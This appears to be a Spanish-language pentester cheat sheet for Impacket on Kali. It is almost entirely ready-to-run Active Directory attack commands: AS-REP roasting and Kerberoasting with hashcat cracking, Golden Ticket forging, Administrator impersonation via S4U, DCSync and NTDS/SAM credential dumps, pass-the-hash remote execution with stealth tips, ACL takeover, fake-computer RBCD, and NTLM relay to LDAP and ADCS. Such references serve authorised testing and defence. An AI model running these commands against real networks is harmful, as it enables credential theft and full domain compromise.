# Chuleta — Impacket 0.14.0.dev0

> Impacket 0.14.0.dev0. En este Kali los scripts viven en
> `/usr/share/doc/python3-impacket/examples/` con 61 wrappers `impacket-<nombre>` en `/usr/bin`.
> Se agregaron symlinks `.py` en `~/.local/bin` para que los comandos de esta chuleta
> funcionen tal cual (`secretsdump.py`, `GetUserSPNs.py`, etc.), incluido `dacledit.py`.
> Ver `../guia/verificado-2026.md`.

---

## Convención de destino

```text
dominio/usuario:password@<IP>
dominio/usuario@<IP> -hashes :<NThash>
```

Con Kerberos, después de exportar el `.ccache`:

```bash
export KRB5CCNAME=usuario.ccache
script.py -k -no-pass <host>.<dominio> -dc-ip <DC_IP>
```

---

## Ataques de credenciales

### AS-REP Roasting

```bash
GetNPUsers.py <DOMINIO>/ -no-pass -dc-ip <DC_IP> \
              -usersfile usuarios.txt -outputfile asrep.txt -format hashcat

# Con credenciales válidas (enumera y ataca de una)
GetNPUsers.py <DOMINIO>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile asrep.txt
```

Flags verificados: `-request`, `-outputfile`, `-format {hashcat,john}`, `-usersfile`,
`-no-pass`, `-hashes`, `-k`, `-aesKey`, `-dc-ip`

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
GetUserSPNs.py <DOMINIO>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerb.txt

# Solo un usuario
GetUserSPNs.py <DOMINIO>/<USER>:<PASS> -dc-ip <DC_IP> -request-user svc_sql -outputfile kerb.txt
```

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### GPP (cpassword)

```bash
Get-GPPPassword.py <DOMINIO>/<USER>:<PASS>@<DC_IP>
```

---

## Kerberos — obtener y usar tiques

### TGT (Pass-the-Key / Overpass-the-Hash)

```bash
# Con contraseña
getTGT.py <DOMINIO>/<USER>:<PASS> -dc-ip <DC_IP>

# Con hash NTLM
getTGT.py <DOMINIO>/<USER> -hashes :<NThash> -dc-ip <DC_IP>

# Con clave AES (mejor: evita RC4 que puede estar deshabilitado)
getTGT.py <DOMINIO>/<USER> -aesKey <AES_KEY> -dc-ip <DC_IP>

export KRB5CCNAME=<USER>.ccache
```

### TGS vía S4U (delegación)

```bash
getST.py -spn cifs/<objetivo>.<dominio> -impersonate Administrator \
         -dc-ip <DC_IP> '<DOMINIO>/<cuenta>$:<PASS>'

# Con hash
getST.py -spn cifs/<objetivo>.<dominio> -impersonate Administrator \
         -hashes :<NThash> -dc-ip <DC_IP> '<DOMINIO>/<cuenta>$'

export KRB5CCNAME=Administrator.ccache
```

Flags verificados: `-spn`, `-impersonate`, `-additional-ticket`, `-force-forwardable`,
`-hashes`, `-no-pass`, `-k`, `-aesKey`, `-dc-ip`

> **`-impersonate` es obligatorio para S4U2Proxy.** Sin él, el tique es de tu propio usuario y
> no sirve para escalar.

### Forjar tiques

```bash
# Golden Ticket (hash del krbtgt)
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain <dominio.local> Administrator

# Con clave AES (si el RC4 está deshabilitado en el dominio)
ticketer.py -aesKey <AES_KRBTGT> -domain-sid <SID> -domain <dominio.local> Administrator
```

```bash
# Convertir formatos de tique
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

### Automatizar elevación a DA

```bash
goldenPac.py <DOMINIO>/<USER>:<PASS>@<DC>.<dominio>     # Golden Ticket + PsExec
raiseChild.py <DOMINIO>/<USER>:<PASS>                    # escalada por dominio hijo
getPac.py -targetUser Administrator <DOMINIO>/<USER>:<PASS>
```

---

## Dumps de credenciales

```bash
# DCSync — todos los hashes del dominio (requiere derechos de replicación)
secretsdump.py '<DOMINIO>/<USER>:<PASS>'@<DC_IP> -just-dc
secretsdump.py '<DOMINIO>/<USER>:<PASS>'@<DC_IP> -just-dc-ntlm
secretsdump.py '<DOMINIO>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt

# Con hash
secretsdump.py -hashes :<NThash> '<DOMINIO>/<USER>'@<DC_IP> -just-dc

# Local (SAM + LSA)
secretsdump.py usuario:clave@<IP>
secretsdump.py -hashes :<NThash> usuario@<IP>

# Desde archivos (SeBackupPrivilege, sin tocar el DC)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

Flags verificados: `-just-dc`, `-just-dc-ntlm`, `-just-dc-user`, `-sam`, `-system`,
`-security`, `-ntds`, `-hashes`, `-no-pass`, `-k`, `-use-vss`, `-outputfile`, `-resumefile`

```bash
# Descifrar secretos DPAPI
dpapi.py masterkey -file masterkey -sid <SID> -password <pass>
dpapi.py credential -file <credencial> -key <masterkey>
```

---

## Ejecución remota

| Script | Método | Requisito | Nota |
| --- | --- | --- | --- |
| `psexec.py` | SMB + servicio | Admin local | Crea servicio: **ruidoso**, deja rastros |
| `wmiexec.py` | WMI | Admin local | **Más sigiloso**, semi-interactivo |
| `atexec.py` | Tarea programada | Admin local | Corre como SYSTEM vía Task Scheduler |
| `dcomexec.py` | DCOM | Admin local | Alternativa si SMB/WMI están filtrados |
| `smbexec.py` | SMB | Admin local | Sin binario en disco |

```bash
psexec.py '<DOMINIO>/<USER>:<PASS>'@<IP>
wmiexec.py '<DOMINIO>/<USER>:<PASS>'@<IP>
atexec.py '<DOMINIO>/<USER>:<PASS>'@<IP> 'whoami'
dcomexec.py '<DOMINIO>/<USER>:<PASS>'@<IP>

# Con hash
psexec.py -hashes :<NThash> '<DOMINIO>/Administrator'@<IP>
wmiexec.py -hashes :<NThash> '<DOMINIO>/Administrator'@<IP>

# Con Kerberos
psexec.py -k -no-pass <host>.<dominio> -dc-ip <DC_IP>
```

---

## ACLs — `dacledit`

> **No está en el PATH.** El módulo `dacledit` no existe en el Impacket instalado. La copia
> funcional está en `/usr/share/doc/python3-impacket/examples/dacledit.py`.

```bash
alias dacledit.py=/usr/share/doc/python3-impacket/examples/dacledit.py
```

Sintaxis verificada:

```text
dacledit.py [-principal NAME] [-target-dn DN] [-action {read,write,remove,backup,restore}]
            [-rights {FullControl,ResetPassword,WriteMembers,DCSync,Custom}]
            [-ace-type {allowed,denied}] [-inheritance] [-use-ldaps]
            identity
```

```bash
# LEER la ACL actual
dacledit.py -action read -principal '<USER>' \
  -target-dn "CN=<OBJETIVO>,CN=Users,DC=dom,DC=local" \
  -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# BACKUP antes de modificar — siempre
dacledit.py -action backup \
  -target-dn "CN=<OBJETIVO>,CN=Users,DC=dom,DC=local" \
  -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# ESCRIBIR: darte FullControl
dacledit.py -action write -rights FullControl -principal '<USER>' \
  -target-dn "CN=<OBJETIVO>,CN=Users,DC=dom,DC=local" \
  -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# RESTAURAR
dacledit.py -action restore \
  -target-dn "CN=<OBJETIVO>,CN=Users,DC=dom,DC=local" \
  -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
```

---

## Cuentas de equipo y delegación

```bash
# Crear una cuenta de equipo (para RBCD)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' \
               -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# Escribir / quitar RBCD
rbcd.py -action write -delegate-from 'FAKE$' -delegate-to '<EQUIPO_OBJETIVO>$' \
        -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

rbcd.py -action read  -delegate-to '<EQUIPO_OBJETIVO>$' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
rbcd.py -action remove -delegate-from 'FAKE$' -delegate-to '<EQUIPO_OBJETIVO>$' \
        -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# Enumerar delegación en todo el dominio
findDelegation.py '<DOMINIO>/<USER>:<PASS>' -dc-ip <DC_IP>
```

---

## Enumeración

```bash
# Usuarios del dominio
GetADUsers.py -all '<DOMINIO>/<USER>:<PASS>' -dc-ip <DC_IP>

# Enumerar SIDs (usuarios, grupos, equipos) sin credenciales
lookupsid.py '<DOMINIO>/<USER>:<PASS>'@<DC_IP>
lookupsid.py -no-pass '<DOMINIO>/<USER>'@<DC_IP>          # con .ccache

# SMB
smbclient.py '<DOMINIO>/<USER>:<PASS>'@<IP>
samrdump.py '<DOMINIO>/<USER>:<PASS>'@<IP>

# RPC
rpcdump.py '<DOMINIO>/<USER>:<PASS>'@<IP>
rpcmap.py '<DOMINIO>/<USER>:<PASS>'@<IP>

# Registro remoto
reg.py '<DOMINIO>/<USER>:<PASS>'@<IP> query -keyName HKLM\\SOFTWARE
registry-read.py -system SYSTEM -software SOFTWARE

# Otros
netview.py -target <DOMINIO> '<DOMINIO>/<USER>:<PASS>'
machine_role.py '<DOMINIO>/<USER>:<PASS>'@<IP>
getArch.py -target <IP>
ntfs-read.py -extract /ruta \\\\.\\C:      # leer NTFS crudo
```

---

## Relay y servidores

```bash
# Servidor SMB para transferir archivos
smbserver.py share /tmp/tools -smb2support

# Relay NTLM
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -i                    # shell interactiva
ntlmrelayx.py -t ldap://<DC> -smb2support --escalate-user <USER> # escalar en AD
ntlmrelayx.py -t http://<CA> --adcs --template <PLANTILLA>       # relay a ADCS
ntlmrelayx.py -t ldaps://<DC> --add-computer --delegate-access   # RBCD vía relay
ntlmrelayx.py -t ldap://<DC> --shadow-credentials --shadow-target '<EQUIPO>$'

# Relay SMB clásico
smbrelayx.py -h <IP> -e payload.exe
```

Flags verificados incluyen: `--adcs`, `--add-computer`, `--delegate-access`,
`--shadow-credentials`, `--shadow-target`, `--escalate-user`, `--dump-laps`, `--dump-gmsa`,
`--enum-local-admins`, `--remove-mic`, `--no-dump`, `--no-da`, `--keep-relaying`

---

## Otros scripts disponibles

`esentutl.py` (leer ESE databases, incluye `NTDS.dit`),
`exchanger.py` (Exchange), `keylistattack.py` (Shadow Credentials por Key Credential Link),
`mimikatz.py` (wrapper remoto), `mssqlinstance.py`, `mqtt_check.py`, `rdp_check.py`,
`sambaPipe.py`, `services.py`, `smbpasswd.py`, `split.py`, `vba_extract.py`,
`wmipersist.py`, `wmiquery.py`

---

## Verificación rápida del entorno

```bash
# Confirmar que los scripts funcionan
for s in GetNPUsers.py GetUserSPNs.py secretsdump.py psexec.py wmiexec.py rbcd.py addcomputer.py; do
  $s --help >/dev/null 2>&1 && echo "[OK] $s" || echo "[FALLA] $s"
done

# dacledit — ruta especial
python3 /usr/share/doc/python3-impacket/examples/dacledit.py --help >/dev/null 2>&1 \
  && echo "[OK] dacledit" || echo "[FALLA] dacledit"
```
